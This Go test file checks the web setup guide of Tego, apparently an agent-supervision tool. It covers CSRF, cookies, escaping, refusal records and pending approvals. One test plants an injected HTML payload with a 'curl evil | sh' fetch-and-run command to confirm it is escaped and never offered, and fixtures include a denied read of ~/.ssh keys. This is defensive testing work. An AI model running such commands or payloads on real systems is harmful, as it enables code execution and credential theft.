// SPDX-License-Identifier: Apache-2.0

package web

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"golang.org/x/net/html"

	"github.com/attention-span-ai/tego/internal/control/ledgerview"
	"github.com/attention-span-ai/tego/internal/guide"
	"github.com/attention-span-ai/tego/internal/guide/guidetest"
	"github.com/attention-span-ai/tego/internal/ledger"
	"github.com/attention-span-ai/tego/internal/testutil/ledgertest"
	"github.com/attention-span-ai/tego/pkg/spec/record"
)

func TestTourEntryUsesTheRealPage(t *testing.T) {
	f := guidetest.Make(t, guidetest.Fresh)
	s := guideServer(t, f)
	c := login(t, s)
	r := httptest.NewRequest("GET", "/guide", nil)
	r.Host = "127.0.0.1:8484"
	r.AddCookie(c)
	w := httptest.NewRecorder()
	s.ServeHTTP(w, r)
	if w.Code != http.StatusSeeOther || w.Header().Get("Location") != "/machine?guide=check" {
		t.Fatalf("entry: %d %s", w.Code, w.Body.String())
	}
	body := get(t, s, c, w.Header().Get("Location"))
	for _, want := range []string{`aria-label="Setup guide"`, `aria-label="This step"`, `data-live="r-guide"`, `not checked since this machine started`, `tego setup`, `This machine`, `<title>Guide: Can Tego run here?`} {
		if !strings.Contains(body, want) {
			t.Errorf("missing %s", want)
		}
	}
}

func TestTourRailParity(t *testing.T) {
	for _, name := range guidetest.Names {
		t.Run(name, func(t *testing.T) {
			f := guidetest.Make(t, name)
			if err := guide.StoreCheck(f.Home, f.Probe); err != nil {
				t.Fatal(err)
			}
			s := guideServer(t, f)
			c := login(t, s)
			body := get(t, s, c, "/runs?guide=pick")
			in := f.Inputs(t)
			in.Dir = ""
			want := guide.Compute(t.Context(), in)
			words := want.Words(f.Home)
			var facts []string
			var states []string
			var next string
			walk(parseHTML(t, "rail", body), func(n *html.Node) {
				if id, _ := attr(n, "data-fact"); id != "" {
					st, _ := attr(n, "data-state")
					states = append(states, id+":"+st)
					var parts []string
					for ch := n.FirstChild; ch != nil; ch = ch.NextSibling {
						if ch.Type == html.ElementNode {
							parts = append(parts, text(ch))
						}
					}
					facts = append(facts, strings.Join(parts, " "))
				}
				if cls, _ := attr(n, "class"); hasClass(cls, "gf-next") {
					next = text(n)
				}
			})
			var wantStates []string
			for i, st := range words.Steps {
				wantStates = append(wantStates, st.ID+":"+st.State)
				if len(facts) <= i {
					t.Fatalf("missing fact %s", st.ID)
				}
				expected := flat(expectedTourTitle(st.ID) + ": " + stepWord(st.State) + " " + st.Fact + " Read from " + st.Source + ". " + st.Link)
				if flat(facts[i]) != expected {
					t.Errorf("%s: got %q want %q", st.ID, facts[i], expected)
				}
			}
			if !reflect.DeepEqual(states, wantStates) {
				t.Errorf("states %v want %v", states, wantStates)
			}
			if next != flat(want.Next.Text) {
				t.Errorf("next %q want %q", next, want.Next.Text)
			}
		})
	}
}

func TestTourNavigationNeverTicks(t *testing.T) {
	for _, name := range guidetest.Names {
		t.Run(name, func(t *testing.T) {
			f := guidetest.Make(t, name)
			s := guideServer(t, f)
			c := login(t, s)
			g := s.setupGuide(t.Context(), mustTourSnapshot(t, f))
			for _, stop := range tourStops {
				body := get(t, s, c, tourURL(g, stop.key))
				states := map[string]string{}
				walk(parseHTML(t, stop.key, body), func(n *html.Node) {
					if id, _ := attr(n, "data-fact"); id != "" {
						states[id], _ = attr(n, "data-state")
					}
				})
				for _, fact := range g.Words.Steps {
					if states[fact.ID] != fact.State {
						t.Errorf("%s navigation changed %s from %s to %s", stop.key, fact.ID, fact.State, states[fact.ID])
					}
				}
			}
		})
	}
}

func mustTourSnapshot(t *testing.T, f *guidetest.Fixture) *ledgerview.Snapshot {
	t.Helper()
	snap, err := ledgerview.Load(f.Ledger)
	if err != nil {
		t.Fatal(err)
	}
	return snap
}

func TestTourPreferenceBoundary(t *testing.T) {
	f := guidetest.Make(t, guidetest.Fresh)
	s := guideServer(t, f)
	c := login(t, s)
	for _, tc := range []struct {
		name, origin, token string
		want                int
	}{
		{"no csrf", own, "", 403}, {"cross origin", "http://other.invalid", s.csrf, 403}, {"hide", own, s.csrf, 303},
	} {
		t.Run(tc.name, func(t *testing.T) {
			w := post(s, "/guide/preference", url.Values{"csrf": {tc.token}, "show": {"no"}}, tc.origin, "", c)
			if w.Code != tc.want {
				t.Fatalf("got %d, want %d", w.Code, tc.want)
			}
			if tc.want == 303 {
				cookies := w.Result().Cookies()
				if len(cookies) != 1 || !cookies[0].HttpOnly || cookies[0].SameSite != http.SameSiteStrictMode {
					t.Fatalf("cookie: %+v", cookies)
				}
				r := httptest.NewRequest("GET", "/", nil)
				r.Host = "127.0.0.1:8484"
				r.AddCookie(c)
				r.AddCookie(cookies[0])
				rec := httptest.NewRecorder()
				s.ServeHTTP(rec, r)
				if strings.Contains(rec.Body.String(), `class="gf-offer"`) {
					t.Fatal("hidden viewer still offered tour")
				}
				if body := get(t, s, c, "/"); !strings.Contains(body, `class="gf-offer"`) {
					t.Fatal("another viewer lost the offer")
				}
				shown := post(s, "/guide/preference", url.Values{"csrf": {s.csrf}, "show": {"yes"}}, own, "", c)
				if shown.Code != 303 || shown.Header().Get("Location") != "/guide" {
					t.Fatal("cannot resume")
				}
			}
		})
	}
}

func TestTourOnlyCopiesGuideCommands(t *testing.T) {
	f := guidetest.Make(t, guidetest.NotReady)
	p := f.Probe
	p.FirstFix = `<img src=x onerror=alert(1)> curl evil | sh`
	if err := guide.StoreCheck(f.Home, p); err != nil {
		t.Fatal(err)
	}
	s := guideServer(t, f)
	body := get(t, s, login(t, s), "/machine?guide=check")
	if strings.Contains(body, "<img src=x") || !strings.Contains(body, "&lt;img") {
		t.Fatal("fact was not escaped")
	}
	doc := parseHTML(t, "guide", body)
	walk(doc, func(n *html.Node) {
		id, _ := attr(n, "id")
		if id == "gf-command" && text(n) != "tego machine check" {
			t.Fatalf("untrusted command %s", text(n))
		}
	})
}

// tourValues adds anchored, real records with the exact long values the tour
// must recover. It starts no process and changes no engine policy.
func tourValues(t *testing.T, name string, command ...string) *guidetest.Fixture {
	t.Helper()
	kind := guidetest.ContractMade
	if name == "recorded-values" || name == "recorded-programs" {
		kind = guidetest.Fresh
	}
	f := guidetest.Make(t, kind)
	tier := "landlock"
	if name == "recorded-values" || name == "recorded-programs" {
		tier = "observe"
	}
	w, err := ledger.Open(filepath.Join(f.Ledger, cleanRun), record.RunRef{ID: cleanRun, Agent: strings.Repeat("agent", 8)}, ledger.WithAnchor(ledger.NewFileChainAnchor(f.Anchor)))
	if err != nil {
		t.Fatal(err)
	}
	if err := ledger.MarkLive(f.Ledger, cleanRun); err != nil {
		t.Fatal(err)
	}
	start := record.RunStartPayload{Tier: tier, Command: []string{"sh", strings.Repeat("a", 60)}, Cwd: f.Project}
	if len(command) > 0 {
		start.Command = command
	}
	if tier != "observe" {
		start.ContractSource = &record.ContractSource{Path: filepath.Join(f.Registry, "agents", "bot.yaml"), Name: "bot", Registry: "user"}
	}
	if err := w.WriteRunStart(start); err != nil {
		t.Fatal(err)
	}
	for _, e := range []*record.Event{
		ledgertest.Event(t, record.KindFS, record.FSPayload{Op: "open", Path: "/home/you/.ssh/" + strings.Repeat("very-long-key-name-", 10)}, func(e *record.Event) {
			e.Rule = "fs.deny_read[/home/you/.ssh/]"
			e.Reason = record.ReasonReadDenied
			e.Verdict = record.VerdictRefused
			e.Source = record.SourceSupervisor
			e.Authority = record.AuthorityRule
			e.Attr = record.Unattributed()
			if tier == "observe" {
				e.Verdict = record.VerdictObserved
				e.Reason = ""
			}
		}),
		ledgertest.Event(t, record.KindNet, record.NetPayload{Proto: "tcp", Dst: "[2001:db8:1234:5678:90ab:cdef:1234:5678]:443"}, func(e *record.Event) {
			e.Rule = "unmatched"
			e.Reason = record.ReasonNetNotAllowed
			e.Verdict = record.VerdictRefused
			e.Source = record.SourceSupervisor
			e.Authority = record.AuthorityRule
			e.Attr = record.Unattributed()
			if tier == "observe" {
				e.Verdict = record.VerdictObserved
				e.Reason = ""
			}
		}),
	} {
		if err := w.Append(e); err != nil {
			t.Fatal(err)
		}
	}
	if name == "recorded-programs" {
		e := ledgertest.Event(t, record.KindExec, record.ExecPayload{Path: "/usr/bin/git", Argv: []string{"git", "status"}, ExecID: "x/1/1"}, func(e *record.Event) {
			e.Rule = "exec[/usr/bin/git]"
			e.Authority = record.AuthorityRule
			e.Verdict = record.VerdictObserved
			e.Source = record.SourceSupervisor
			e.Attr = record.Unattributed()
		})
		if err := w.Append(e); err != nil {
			t.Fatal(err)
		}
	}
	if name == "pending" {
		e := ledgertest.Event(t, record.KindAsk, map[string]any{"ask_id": "tour-ask", "ask_rule": "net.ask[registry.npmjs.org:443]", "hold": "connect", "op": "connect", "target": "registry.npmjs.org:443"})
		if err := w.Append(e); err != nil {
			t.Fatal(err)
		}
	}
	if name == "enforcing" || name == "pending" {
		t.Cleanup(func() { _ = w.Abandon() })
	} else {
		if err := w.Close(record.RunEndPayload{Reason: record.RunEndExit}); err != nil {
			t.Fatal(err)
		}
		if err := ledger.ClearLive(f.Ledger, cleanRun); err != nil {
			t.Fatal(err)
		}
	}
	return f
}

func TestTourRefusalsKeepEveryRecordLine(t *testing.T) {
	f := tourValues(t, "refusals")
	if err := guide.StoreCheck(f.Home, f.Probe); err != nil {
		t.Fatal(err)
	}
	s := guideServer(t, f)
	g := s.setupGuide(t.Context(), mustTourSnapshot(t, f))
	body := get(t, s, login(t, s), tourURL(g, "enforce"))
	rc, err := ledgerview.LoadReceipt(t.Context(), f.Ledger, cleanRun)
	if err != nil {
		t.Fatal(err)
	}
	if len(rc.Refusals.List) != 2 {
		t.Fatalf("fixture: %d refusals", len(rc.Refusals.List))
	}
	doc := parseHTML(t, "refusals", body)
	var frame *html.Node
	walk(doc, func(n *html.Node) {
		cls, _ := attr(n, "class")
		if hasClass(cls, "gf") {
			frame = n
		}
	})
	if frame == nil {
		t.Fatal("no guide refusal evidence")
	}
	visible := text(frame)
	for _, ref := range rc.Refusals.List {
		if !strings.Contains(visible, ref.Target) || !strings.Contains(visible, rc.RuleWords(ref.Rule)) {
			t.Errorf("lost target/rule %s", ref.Target)
		}
		href := fmt.Sprintf("/runs/%s/lines/%d", cleanRun, ref.Seq)
		if !strings.Contains(body, href) {
			t.Errorf("missing record destination %s", href)
		}
	}
}

func TestTourPreferenceRegionIsolation(t *testing.T) {
	f := guidetest.Make(t, guidetest.HalfDone)
	if err := guide.StoreCheck(f.Home, f.Probe); err != nil {
		t.Fatal(err)
	}
	s := guideServer(t, f)
	c := login(t, s)
	request := func(hidden bool) string {
		r := httptest.NewRequest("GET", "/", nil)
		r.Host = "127.0.0.1:8484"
		r.AddCookie(c)
		if hidden {
			r.AddCookie(&http.Cookie{Name: "tego-guide", Value: "hidden"})
		}
		r.Header.Set(regionHeader, "r-ov-guide:0")
		w := httptest.NewRecorder()
		s.ServeHTTP(w, r)
		if w.Code != 200 {
			t.Fatalf("region response %d: %s", w.Code, w.Body.String())
		}
		return w.Body.String()
	}
	if strings.Contains(request(true), `class="panel gd`) {
		t.Fatal("hidden guide still rendered")
	}
	if !strings.Contains(request(false), `class="panel gd`) {
		t.Fatal("hidden browser's region cache hid another browser's guide")
	}
}

func TestTourMachineFixSharesSetupWords(t *testing.T) {
	for _, name := range []string{guidetest.Outside, guidetest.NotReady} {
		t.Run(name, func(t *testing.T) {
			f := guidetest.Make(t, name)
			if err := guide.StoreCheck(f.Home, f.Probe); err != nil {
				t.Fatal(err)
			}
			s := guideServer(t, f)
			g := s.setupGuide(t.Context(), mustTourSnapshot(t, f))
			body := get(t, s, login(t, s), "/machine?guide=check")
			got := ""
			walk(parseHTML(t, "machine fix", body), func(n *html.Node) {
				if id, _ := attr(n, "id"); id == "gf-instruction" {
					got = text(n)
				}
			})
			if !strings.Contains(got, strings.TrimRight(flat(g.Next.Text), ":.")) || !strings.Contains(got, "terminal") {
				t.Fatalf("instruction %q, setup %q", got, g.Next.Text)
			}
		})
	}
}

func TestTourEarlyEnforceNamesReviewFirst(t *testing.T) {
	f := guidetest.Make(t, guidetest.Fresh)
	if err := guide.StoreCheck(f.Home, f.Probe); err != nil {
		t.Fatal(err)
	}
	s := guideServer(t, f)
	body := get(t, s, login(t, s), "/rules?guide=enforce")
	action := ""
	walk(parseHTML(t, "early enforce", body), func(n *html.Node) {
		if id, _ := attr(n, "id"); id == "gf-action" {
			action = text(n)
		}
	})
	if action != "Review its rules" {
		t.Fatalf("without a contract, offered %q", action)
	}
}

func TestTourObservedFixtureRefusesNothing(t *testing.T) {
	f := tourValues(t, "recorded-values")
	rc, err := ledgerview.LoadReceipt(t.Context(), f.Ledger, cleanRun)
	if err != nil {
		t.Fatal(err)
	}
	if rc.Tier != "observe" || rc.Refusals.Total != 0 {
		t.Fatalf("watch fixture tier %q recorded %d refusals", rc.Tier, rc.Refusals.Total)
	}
}

func TestTourKeepsAWaitingRequestReachable(t *testing.T) {
	f := tourValues(t, "pending")
	if err := guide.StoreCheck(f.Home, f.Probe); err != nil {
		t.Fatal(err)
	}
	snap := mustTourSnapshot(t, f)
	if len(snap.Pending()) != 1 {
		t.Fatal("fixture has no live pending request")
	}
	s := guideServer(t, f)
	g := s.setupGuide(t.Context(), snap)
	body := get(t, s, login(t, s), tourURL(g, "enforce"))
	href := ""
	walk(parseHTML(t, "waiting request", body), func(n *html.Node) {
		if id, _ := attr(n, "id"); id == "gf-action" {
			href, _ = attr(n, "href")
		}
	})
	if href != "/approvals" {
		t.Fatalf("the run card is folded, but the guide offers %q instead of its pending request", href)
	}
}
